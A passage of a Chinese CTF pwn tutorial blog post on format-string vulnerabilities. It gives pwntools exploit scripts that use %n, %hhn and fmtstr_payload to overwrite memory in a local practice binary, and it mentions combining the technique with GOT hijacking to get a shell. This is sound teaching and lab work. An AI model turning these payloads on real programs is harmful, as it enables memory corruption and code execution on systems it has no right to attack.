+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span><span class="s1">&#39;splitw&#39;</span><span class="p">,</span><span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./overwrite&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="n">leak</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;</span><span class="si">%012d</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;%6$n&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109162944216.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109162944216.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109162944216.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109162944216.png?size=large 2x" sizes="auto" data-title="image-20231109162944216" data-alt="image-20231109162944216" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>成功修改。</p>
+<h2 id="覆盖任意地址内存为小数字">覆盖任意地址内存为小数字</h2>
+<p>对于32位程序来说，地址肯定是4字节的。如果将地址放在开头，那么至少会写成4。为了写更小的数字，可以将地址放在后面。</p>
+<p>由于此时地址是按4字节分割的，我们不用重新定位位置。按照上次定位的位置推即可。</p>
+<div class="highlight" id="id-7"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AA$8$nxx[addr]</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为要将a改写为2，<code>$8$n</code>前面只能有2个字符。然后为了凑整，后面再次填写两个字符。最后再加上地址即可。此时的参数位置：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109165043444.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109165043444.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109165043444.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109165043444.png?size=large 2x" sizes="auto" data-title="image-20231109165043444" data-alt="image-20231109165043444" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>因此写入第八位即可改写addr处的地址位2。</p>
+<div class="highlight" id="id-8"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span><span class="s1">&#39;splitw&#39;</span><span class="p">,</span><span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./overwrite&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="mh">0x804C024</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;AA&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;%8$nxx&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">leak</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109165701091.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109165701091.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109165701091.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109165701091.png?size=large 2x" sizes="auto" data-title="image-20231109165701091" data-alt="image-20231109165701091" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="覆盖任意地址内存为大地址">覆盖任意地址内存为大地址</h2>
+<p>上面介绍了覆盖小数字，这里我们介绍如何覆盖大数字。上面我们也说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？自然是有了。</p>
+<p>不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p>
+<div class="highlight" id="id-9"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。
+</span></span><span class="line"><span class="cl">h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以说，我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。</p>
+<p>首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804c024。</p>
+<p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p>
+<div class="highlight" id="id-10"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x0804c024 \x78
+</span></span><span class="line"><span class="cl">0x0804c025 \x56
+</span></span><span class="line"><span class="cl">0x0804c026 \x34
+</span></span><span class="line"><span class="cl">0x0804c027 \x12</span></span></code></pre></td></tr></table>
+</div>
+</div><p>首先，由于我们的字符串的偏移为 6，所以我们可以确定我们的 payload 基本是这个样子的：</p>
+<div class="highlight" id="id-11"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">p32(0x0804c024)+p32(0x0804c025)+p32(0x0804c026)+p32(0x0804c027)+pad1+&#39;%6$n&#39;+pad2+&#39;%7$n&#39;+pad3+&#39;%8$n&#39;+pad4+&#39;%9$n&#39;</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109170027894.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109170027894.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109170027894.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109170027894.png?size=large 2x" sizes="auto" data-title="image-20231109170027894" data-alt="image-20231109170027894" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>接下来，我们需要将已经写入的字符个数和需要修改的内容做差，即可求出padding的具体大小。这里为了方便，可以使用pwntools自带的<code>fmtstr_payload</code>函数构造payload：</p>
+<div class="highlight" id="id-12"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,{</span><span class="mh">0x0804c024</span><span class="p">:</span><span class="mh">0x12345678</span><span class="p">})</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight" id="id-13"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span><span class="s1">&#39;splitw&#39;</span><span class="p">,</span><span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./overwrite&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="mh">0x804C028</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,{</span><span class="n">leak</span><span class="p">:</span><span class="mh">0x12345678</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果如下：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109170514955.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109170514955.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109170514955.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231109170514955.png?size=large 2x" sizes="auto" data-title="image-20231109170514955" data-alt="image-20231109170514955" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>以上是格式化字符串使用的基本思路。平常的使用经常会和劫持GOT表或者返回地址结合来达到getshell的效果。</p>
+<h2 id="补充">补充</h2>
+<p>由于64位地址正常不会满8字节，因此请将地址放在fmt后面，这样可以防止地址高位补0而导致的零截断。</p>
+<div class="highlight" id="id-14"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%6$sxxxx\xc0\x40\x40\x00\x00\x00\x00\x00
+</span></span><span class="line"><span class="cl"># fault: \xc0\x40\x40\x00\x00\x00\x00\x00%6$sxxxx </span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-11-09 08:41:47">更新于 2023-11-09&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/articles/2023/11/fmt_str/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://alextang.top/articles/2023/11/fmt_str/" data-title="格式化字符串漏洞总结" data-via="a1extang" data-hashtags="CTF,Pwn"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://alextang.top/articles/2023/11/fmt_str/" data-hashtag="CTF"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://alextang.top/articles/2023/11/fmt_str/" data-title="格式化字符串漏洞总结"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/ctf/' class="post-tag">CTF</a><a href='/tags/pwn/' class="post-tag">Pwn</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/articles/2023/11/pcb2023/" class="post-nav-item" rel="prev" title="鹏城杯2023WriteUp-Pwn"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>鹏城杯2023WriteUp-Pwn</a>
+      <a href="/articles/2023/11/partial_overwrite/" class="post-nav-item" rel="next" title="部分写固定思路">部分写固定思路<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">alextang</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="icp footer-divider"><a href="https://icp.gov.moe/?keyword=20238299" target="_blank">萌ICP备20238299号</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js" async defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/copy-tex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/mhchem.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
